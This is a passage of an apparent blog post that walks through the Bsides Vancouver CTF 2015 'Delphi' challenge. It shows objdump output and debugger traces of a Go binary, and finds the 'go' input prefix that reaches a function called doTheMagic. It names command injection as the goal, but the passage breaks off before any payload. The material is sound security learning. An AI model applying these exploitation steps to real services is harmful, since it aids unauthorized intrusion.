<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Bsides Vancouver CTF 2015 - Delphi &#8211; A Little (1 << 3) + y</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Bsides Vancouver CTF 2015 - Delphi (200 ownable) Writeup">
    <meta name="author" content="Chris">
    <meta name="keywords" content="ctf, format-string">
    <link rel="canonical" href="breadchris.github.io/ctf/format-string/2015/04/04/bsides-vancouver/">
    <link rel="alternate" type="application/rss+xml" title="RSS Feed for A Little (1 << 3) + y" href="/feed.xml" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/pixyll.css?201508122215" type="text/css">
    <link rel="stylesheet" href="/css/prism.css?201508122215" type="text/css">

    <!-- Fonts -->
    <link href='//fonts.googleapis.com/css?family=Merriweather:900,900italic,300,300italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Lato:900,300' rel='stylesheet' type='text/css'>
    
      <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
    


    <!-- Open Graph -->
    <!-- From: https://github.com/mmistakes/hpstr-jekyll-theme/blob/master/_includes/head.html -->
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Bsides Vancouver CTF 2015 - Delphi">
    <meta property="og:description" content="Blades out like Wolverine, but it was all a huge act man. ~ octobersveryown">
    <meta property="og:url" content="breadchris.github.io/ctf/format-string/2015/04/04/bsides-vancouver/">
    <meta property="og:site_name" content="A Little (1 &lt;&lt; 3) + y">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary" />
    
        <meta name="twitter:site" content="@breadchris" />
    
    <meta name="twitter:title" content="Bsides Vancouver CTF 2015 - Delphi" />
    <meta name="twitter:description" content="Bsides Vancouver CTF 2015 - Delphi (200 ownable) Writeup" />
    <meta name="twitter:url" content="breadchris.github.io/ctf/format-string/2015/04/04/bsides-vancouver/" />

    <!-- Icons -->
    <link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png">
    <link rel="icon" type="image/png" href="/favicon-192x192.png" sizes="192x12">
    <link rel="icon" type="image/png" href="/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
        
    
</head>

<body class="site">
  <div class="site-wrap">
    <header class="site-header px2 px-responsive">
  <div class="mt2 wrap">
    <div class="measure">
      <a href="breadchris.github.io" class="site-title">A Little (1 << 3) + y</a>
      <nav class="site-nav">
        <a href="/about/">About</a>
<a href="/contact/">Contact</a>

      </nav>
      <div class="clearfix"></div>
      
        <div class="social-icons">
  <div class="left">
    
      <a class="fa fa-github" href="https://github.com/breadchris"></a>
    
    
    <a class="fa fa-rss" href="/feed.xml"></a>
    
      <a class="fa fa-twitter" href="https://twitter.com/breadchris"></a>
    
    
    
    
    
  </div>
  <div class="right">
    
    
    
  </div>
</div>
<div class="clearfix"></div>

      
    </div>
  </div>
</header>


    <div class="post p2 p-responsive wrap" role="main">
      <div class="measure">
        


<div class="post-header mb2">
  <h1>Bsides Vancouver CTF 2015 - Delphi</h1>
  <span class="post-meta">Apr 4, 2015</span><br>
    
  <span class="post-meta small">
  
    21 minute read
  
  </span>
</div>

<article class="post-content">
  <p>files given:</p>

<ul>
  <li>delphi-07a5c9d07a4c20ae81a2ddc66b9602d0dcceb74b</li>
  <li>libtwenty.so-4a3918b2efd9fbdfd20eeb8fa51ca76bc42eb2f2</li>
</ul>

<p>TL;DR</p>

<ul>
  <li>Reverse Command Protocol</li>
  <li>Integer Overflow</li>
  <li>Metacharacter Injection</li>
</ul>

<p>First we identify what type of binary we are dealing with:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  file delphi
<a name="True-2"></a>delphi: ELF 64-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0x936b88708739382f1d376e89a4b82a4248d19b08, not stripped</code></pre></div>

<p>Running objdump -t delphi, we can see some symbols of the binary and from these we can conclude it is a compiled Golang program:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  objdump -t delphi <span class="p">|</span> grep go
<a name="True-2"></a><span class="m">0000000000506920</span> l    d  .gopclntab	<span class="m">0000000000000000</span>              .gopclntab
<a name="True-3"></a>0000000000754ff0 l    d  .got	<span class="m">0000000000000000</span>              .got
<a name="True-4"></a><span class="m">0000000000755000</span> l    d  .got.plt	<span class="m">0000000000000000</span>              .got.plt
<a name="True-5"></a><span class="m">0000000000000000</span> l    df *ABS*	<span class="m">0000000000000000</span>              _cgo_export.c
<a name="True-6"></a><span class="m">0000000000000000</span> l    df *ABS*	<span class="m">0000000000000000</span>              main.cgo2.c
<a name="True-7"></a><span class="m">0000000000000000</span> l    df *ABS*	<span class="m">0000000000000000</span>              _cgo_export.c
<a name="True-8"></a><span class="m">0000000000000000</span> l    df *ABS*	<span class="m">0000000000000000</span>              cgo.cgo2.c
<a name="True-9"></a><span class="m">0000000000000000</span> l    df *ABS*	<span class="m">0000000000000000</span>              /var/tmp/go-link-Sk9whB/go.o
<a name="True-10"></a>00000000004f5138 l     O .rodata	<span class="m">0000000000000000</span>              go.func.*
<a name="True-11"></a>00000000004d37c0 l     O .rodata	<span class="m">0000000000000000</span>              go.string.*
<a name="True-12"></a>...</code></pre></div>

<p>Now we have to make sure our system finds the libtwenty.so object file (just add the directory where you have libtwenty.so to the <code>LD_LIBRARY_PATH</code> environment variable):</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  <span class="nb">export </span><span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span></code></pre></div>

<p>So when we run this program, we are prompted with:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  ./delphi 
<a name="True-2"></a>Welcome!
<a name="True-3"></a>
<a name="True-4"></a>Are you ready to play <span class="m">20</span> questions? No? Perfect!
<a name="True-5"></a>Im thinking of something big, metal, and orange. Go!
<a name="True-6"></a>&gt;</code></pre></div>

<p>OK, so we have a place to input data… let’s first look for a place we can latch onto:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">➜</span>  <span class="nf">yvr</span>  <span class="nv">objdump</span> <span class="o">-</span><span class="nv">t</span> <span class="nv">delphi</span> <span class="o">|</span> <span class="nv">grep</span> <span class="nv">main</span>
<a name="True-2"></a><span class="err">0000000000000000</span> <span class="nf">l</span>    <span class="nv">df</span> <span class="o">*</span><span class="nv">ABS</span><span class="o">*</span>	<span class="mi">0000000000000000</span>              <span class="nv">main.cgo2.c</span>
<a name="True-3"></a><span class="err">0000000000504</span><span class="nf">ff8</span> <span class="nv">l</span>     <span class="nv">O</span> <span class="nv">.rodata</span>	<span class="mi">0000000000000008</span>              <span class="nv">runtime.main.f</span>
<a name="True-4"></a><span class="err">00000000005050</span><span class="nf">d0</span> <span class="nv">l</span>     <span class="nv">O</span> <span class="nv">.rodata</span>	<span class="mi">0000000000000010</span>              <span class="nv">go.importpath.main.</span>
<a name="True-5"></a><span class="err">000000000076</span><span class="nf">d164</span> <span class="nv">l</span>     <span class="nv">O</span> <span class="nv">.noptrbss</span>	<span class="mi">0000000000000001</span>              <span class="nv">main.initdone.</span>
<a name="True-6"></a><span class="err">0000000000505</span><span class="nf">ae0</span> <span class="nv">l</span>     <span class="nv">O</span> <span class="nv">.rodata</span>	<span class="mi">0000000000000060</span>              <span class="nv">main.statictmp_0021</span>
<a name="True-7"></a><span class="err">0000000000401280</span> <span class="nf">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">00000000000009</span><span class="nv">b0</span>              <span class="nv">main.main</span>
<a name="True-8"></a><span class="err">0000000000401</span><span class="nf">c30</span> <span class="nv">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">00000000000001</span><span class="nv">c0</span>              <span class="nv">main.doTheMagic</span>
<a name="True-9"></a><span class="err">0000000000401</span><span class="nf">df0</span> <span class="nv">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000070</span>              <span class="nv">main.init</span>
<a name="True-10"></a><span class="err">00000000004021</span><span class="nf">c0</span> <span class="nv">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000070</span>              <span class="nv">main._Cfunc_CString</span>
<a name="True-11"></a><span class="err">0000000000402230</span> <span class="nf">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000040</span>              <span class="nv">main._Cfunc_check_answer</span>
<a name="True-12"></a><span class="err">0000000000402270</span> <span class="nf">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000040</span>              <span class="nv">main._Cfunc_free</span>
<a name="True-13"></a><span class="err">0000000000411</span><span class="nf">b20</span> <span class="nv">l</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000170</span>              <span class="nv">runtime.main</span>
<a name="True-14"></a><span class="err">0000000000000000</span>       <span class="nf">F</span> <span class="o">*</span><span class="nv">UND</span><span class="o">*</span>	<span class="mi">0000000000000000</span>              <span class="nv">__libc_start_main@@GLIBC_2.2.5</span>
<a name="True-15"></a><span class="err">00000000004295</span><span class="nf">b0</span> <span class="nv">g</span>     <span class="nv">F</span> <span class="nv">.text</span>	<span class="mi">0000000000000010</span>              <span class="nv">main</span></code></pre></div>

<p>Alright so we found main (really main.main, since this is a Golang program), and we also found a function “main.doTheMagic”, interesting… let’s try to see if we can get there.</p>

<p>We first find where our input is being read in:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x401747</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1223</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x40174c</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1228</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbx</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="p">]</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x401751</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1233</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span><span class="nb">rbx</span>
<a name="True-4"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x401755</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1237</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x42cf70</span> <span class="o">&lt;</span><span class="nv">bufio.</span><span class="p">(</span><span class="o">*</span><span class="nv">Scanner</span><span class="p">)</span><span class="nv">.Scan</span><span class="o">&gt;</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x40175a</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1242</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">rbx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x401760</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1248</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x0</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x401763</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1251</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0x4018b1</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1585</span><span class="o">&gt;</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x401769</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1257</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x48</span><span class="p">]</span></code></pre></div>

<p>If we continue to step (Whenever I debug, I can’t help but think about Vampire Weekend’s Step, naturally that is on a loop when I’m doing this :D), we end up here:</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<a name="True-2"></a><span class="nl">RAX:</span> <span class="err">0</span><span class="nf">x2</span> 
<a name="True-3"></a><span class="nl">RBX:</span> <span class="err">0</span><span class="nf">x4d7f60</span> <span class="o">--&gt;</span> <span class="mh">0x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="s">&#39;go&#39;</span><span class="p">)</span>
<a name="True-4"></a><span class="nl">RDX:</span> <span class="err">0</span><span class="nf">xa</span> <span class="p">(</span><span class="s">&#39;\n&#39;</span><span class="p">)</span>
<a name="True-5"></a><span class="nl">RSI:</span> <span class="err">0</span><span class="nf">x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="s">&#39;go&#39;</span><span class="p">)</span>
<a name="True-6"></a><span class="nl">RDI:</span> <span class="err">0</span><span class="nf">xc208000270</span> <span class="p">(</span><span class="s">&quot;TEST INPUT&quot;</span><span class="p">)</span>
<a name="True-7"></a><span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x401939</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1721</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbx</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
<a name="True-9"></a>   <span class="err">0</span><span class="nf">x40193d</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1725</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x90</span><span class="p">],</span><span class="nb">rdx</span>
<a name="True-10"></a>   <span class="err">0</span><span class="nf">x401945</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1733</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0xb0</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-11"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x40194d</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1741</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rdx</span><span class="p">,</span><span class="nb">rax</span>                     <span class="c1">; Compares the length of &quot;go&quot; to our input</span>
<a name="True-12"></a>   <span class="err">0</span><span class="nf">x401950</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1744</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jl</span>     <span class="mh">0x401baa</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">2346</span><span class="o">&gt;</span>   <span class="c1">; Go somewhere else if our input&#39;s length is &lt; 2</span>
<a name="True-13"></a>   <span class="err">0</span><span class="nf">x401956</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1750</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">rdx</span><span class="p">,</span><span class="nb">rax</span>                     
<a name="True-14"></a>   <span class="err">0</span><span class="nf">x401959</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1753</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jb</span>     <span class="mh">0x401bb2</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">2354</span><span class="o">&gt;</span>    
<a name="True-15"></a>   <span class="err">0</span><span class="nf">x40195f</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1759</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">],</span><span class="nb">rdi</span></code></pre></div>

<p>Alright, so it compares the length of our input to 2 and if it is smaller then it will presumablely quit. </p>

<p>Moving forward…</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">[----------------------------------</span><span class="nf">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<a name="True-2"></a><span class="nl">RAX:</span> <span class="err">0</span><span class="nf">x2</span> 
<a name="True-3"></a><span class="nl">RSI:</span> <span class="err">0</span><span class="nf">x4d7f70</span> <span class="o">--&gt;</span> <span class="mh">0x6f67</span> <span class="p">(</span><span class="s">&#39;go&#39;</span><span class="p">)</span>
<a name="True-4"></a><span class="nl">RDI:</span> <span class="err">0</span><span class="nf">xc208000270</span> <span class="p">(</span><span class="s">&quot;TEST INPUT&quot;</span><span class="p">)</span>
<a name="True-5"></a><span class="err">[-------------------------------------</span><span class="nf">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x40197c</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1788</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x401981</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1793</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">],</span><span class="nb">rsi</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x401986</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1798</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-9"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x40198b</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1803</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x425600</span> <span class="o">&lt;</span><span class="nv">runtime.eqstring</span><span class="o">&gt;</span>
<a name="True-10"></a>   <span class="err">0</span><span class="nf">x401990</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1808</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">rbx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x20</span><span class="p">]</span>
<a name="True-11"></a>   <span class="err">0</span><span class="nf">x401996</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1814</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x0</span>
<a name="True-12"></a>   <span class="err">0</span><span class="nf">x401999</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1817</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0x401baa</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">2346</span><span class="o">&gt;</span>
<a name="True-13"></a>   <span class="err">0</span><span class="nf">x40199f</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1823</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="mh">0x1</span></code></pre></div>

<p>So it looks like the program checks to make sure the first two characters of the string are “go”, so let’s give that a try to see if anything different happens:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><a name="True-1"></a>➜  yvr  ./delphi 
<a name="True-2"></a>Welcome!
<a name="True-3"></a>
<a name="True-4"></a>Are you ready to play <span class="m">20</span> questions? No? Perfect!
<a name="True-5"></a>Im thinking of something big, metal, and orange. Go!
<a name="True-6"></a>&gt; go
<a name="True-7"></a>Sneaky, sneaky. Go where? How fast?
<a name="True-8"></a>&gt; something <span class="k">else</span>
<a name="True-9"></a>Whos that?
<a name="True-10"></a>&gt; asdfasdf
<a name="True-11"></a>Whos that?
<a name="True-12"></a>&gt; asdfasdfasd
<a name="True-13"></a>Maybe? Hmmm.
<a name="True-14"></a>&gt;</code></pre></div>

<p>So “go” is definetly what we want for the first part of our payload.</p>

<p>Let’s see where this takes us now…</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x401a04</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1924</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span><span class="nb">rcx</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x401a08</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1928</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x70</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x401a0d</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1933</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="nb">rax</span>
<a name="True-4"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x401a12</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1938</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x401c30</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">&gt;</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x401a17</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1943</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">lea</span>    <span class="nb">rbx</span><span class="p">,</span><span class="nb">ds</span><span class="p">:</span><span class="mh">0x4d4060</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x401a1f</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1951</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbx</span><span class="p">]</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x401a22</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1954</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0xd8</span><span class="p">],</span><span class="nb">rbp</span>
<a name="True-8"></a>   <span class="err">0</span><span class="nf">x401a2a</span> <span class="o">&lt;</span><span class="nv">main.main</span><span class="o">+</span><span class="mi">1962</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rbp</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rbx</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span></code></pre></div>

<p>Sweet :D, we can get to the magic function now…</p>

<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><a name="True-1"></a><span class="err">0</span><span class="nf">x401c77</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">71</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdi</span><span class="p">,</span><span class="nb">rbp</span>
<a name="True-2"></a>   <span class="err">0</span><span class="nf">x401c7a</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movs</span>   <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">es</span><span class="p">:[</span><span class="nb">rdi</span><span class="p">],</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">ds</span><span class="p">:[</span><span class="nb">rsi</span><span class="p">]</span>
<a name="True-3"></a>   <span class="err">0</span><span class="nf">x401c7c</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movs</span>   <span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">es</span><span class="p">:[</span><span class="nb">rdi</span><span class="p">],</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="nb">ds</span><span class="p">:[</span><span class="nb">rsi</span><span class="p">]</span>
<a name="True-4"></a><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">x401c7e</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">call</span>   <span class="mh">0x44a480</span> <span class="o">&lt;</span><span class="nv">strings.Split</span><span class="o">&gt;</span>
<a name="True-5"></a>   <span class="err">0</span><span class="nf">x401c83</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">83</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rdx</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x20</span><span class="p">]</span>
<a name="True-6"></a>   <span class="err">0</span><span class="nf">x401c88</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rax</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x28</span><span class="p">]</span>
<a name="True-7"></a>   <span class="err">0</span><span class="nf">x401c8d</span> <span class="o">&lt;</span><span class="nv">main.doTheMagic</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">rcx</span><span class="p">,</span><span class="kt">QWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x30</span><span class="p">]</span>
